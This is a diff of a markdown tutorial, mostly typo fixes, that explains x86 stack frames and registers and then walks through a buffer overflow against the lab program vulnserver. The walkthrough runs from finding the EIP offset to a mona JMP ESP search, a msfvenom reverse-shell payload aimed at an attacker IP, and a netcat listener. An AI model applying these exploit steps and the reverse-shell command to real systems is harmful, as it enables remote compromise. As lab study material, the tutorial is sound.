@@ -1,15 +1,15 @@
 # basics
-
+Stack overview:
 ![Buffer Overflow](/img/x86Memory.png)
 
 ## Stack
-* When a tread is running it execute code form the progam image or the DDLs.
-* The thread requieres short term data areas for functions, variable, program control information => stack.
+* When a tread is running it executes code form the program image or the DDLs.
+* The thread requires short term data areas for functions, variable, program control information => stack.
 * Each threat has its own stack
 * LIFO (push/pop)
 
 ## Function return mechanics
-When code wihting a thread calls a function is must know on which address to return to once the function is completed
+When code within a thread calls a function is must know on which address to return to once the function is completed
 
 Example of return mechanics (stored in a section of stack called stack frame):
 | Thread stack frame example|
@@ -22,19 +22,19 @@ Example of return mechanics (stored in a section of stack called stack frame):
 Small high speed cpu storage locations
 * Different registers exists from 32-bit to 8 bits
 
-Most imporant registers (32-bit):
-* EAX: for aritmecical and logic instrucations
+Most important registers (32-bit):
+* EAX: for arithmetical and logic instructions
 * EBX: base pointer for memory addresses
 * ECX: Loop, shift and rotation counter
 * EDX: I/O Port addressing, division, multiplication
 * ESI: Pointer of data and source 
-* EDi: Pointer of data nd desination in string copy operations
+* EDi: Pointer of data and desination in string copy operations
 
-* ESP stack pointer (keeps track of most receent reference locations by stack)
+* ESP stack pointer (keeps track of most recent reference locations by stack)
 * EBP base pointer (stores a pointer to the top of the sack when a funciton is called)
 * EIP always points to the next code instrucation to be executed
 
-# sample volnurable code (C)
+# sample vulnerable code (C)
 //what happens when buffer.length greater than 64? => buffer overflow; overflowing its reserved boundaries
 ``char buffer[64]; strcpy(buffer, argv[1]);``
 
@@ -48,21 +48,21 @@ Most imporant registers (32-bit):
 with nc you can setup a connection to vulnserver to check it
 
 * but kill nc it and run the script ``bufferOverflowHelper.py`` and will hopefully result in something like ``Fuzzing crashed at 22105 bytes``
-* Also we see in the immunulty debugger that EIP has been overridding and that it is failing
+* Also we see in the immunity debugger that EIP has been overriding and that it is failing
 
 ### detect location of EIP
 
 * to detect location use: ``/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 24105``
 * will generate a text and pass this into the ``bufferOverflowHelper.py``
-* in immuniaty debugger save the EIP hex, f.i: ``386F4337``
+* in imm. debugger save the EIP hex, f.i: ``386F4337``
 * again with metasploit detect in which location the value is ``/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 24105 -q 386F4337``
-* This will geneate the location: ``Exact match at offset 2003`` which means that EIP starts at *2003*
+* This will generate the location: ``Exact match at offset 2003`` which means that EIP starts at *2003*
 
 ### override EIP
 * in your python file substitute buffer where EIP starts (in our case *2003*) with ``buffer = "A" * 2003 + "B" * 4``
 * when running the script we will set that EIP is ``42424242`` => BBBB
 * Search for badchars in Google, leads to: https://github.com/mrinalpande/scripts/blob/master/python/badchars
-* copy this bad chars in your python script and delete 00 && X70 put it in ``badchars`` variable
+* copy those bad chars in your python script and delete 00 && X70 put it in ``badchars`` variable
 * buffer variable should look like ``buffer = "A" * 2003 + "B" * 4 + badchars`` 
 
 ### check hexdumb of ESP for bad chars
@@ -75,8 +75,8 @@ with nc you can setup a connection to vulnserver to check it
 Some DLLs have protection against buffer overflow so we need to finds DLLs which do not have it.
 * Download monamodule from github: (Mona)[https://github.com/corelan/mona]
 * Paste mona.py file under: ``D:\Immunity Debugger\PyCommands``
-* In immunuty debugger writh (text field in the lower left corner): ``!mona modules`` and hit enter
-* We then see protection settings for certain dlls (check for everything false and attached to the program), in our examlpe: ``essfunc.dll``
+* In imm. debugger writh (text field in the lower left corner): ``!mona modules`` and hit enter
+* We then see protection settings for certain dlls (check for everything false and attached to the program), in our example: ``essfunc.dll``
 
 ### locate JMP commands
 Pointer will jump to our malicuous shell code
@@ -86,7 +86,7 @@ Pointer will jump to our malicuous shell code
 * In immunity debugger type in the lower left corner: ``!mona find -s "\xff\xe4" -m essfunc.dll`` => remember: \x *ff* \x *e4*
 * Generates: ``\xff\xe4 & 0x625011af``
 * In our script we write in reverse order ``buffer = "A" * 2003 + "\xaf\x11\x50\x62"``
-* In immunity debugger debug (lclick on most right symbol, in line with the play button) and enter: ``625011af``
+* In imm. debugger debug (click on most right symbol, in line with the play button) and enter: ``625011af``
 * We are overridding the EIP with our command, you will see the hash code 625011af
 
 ### gaining shell
@@ -96,5 +96,5 @@ type with ip of the "acker": ``msfvenom -p windows/shell_reverse_tcp LHOST=192.1
 * Copy this into our python file as overflow variable like: ``buffer = "A" * 2003 + "B" * 4 + "\xaf\x11\x50\x62" + overflow``
 * Add naf space to variable (play a bit around with the size: "\x90" * 8) ``buffer = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 8 +  overflow``=> example bufferOverflowHelperFinal.py
 * Start netcat on linux by listening on port 4444
-* Run applicatino in admin mode and execute script
+* Run application in admin mode and execute script
 * Reverse shell established
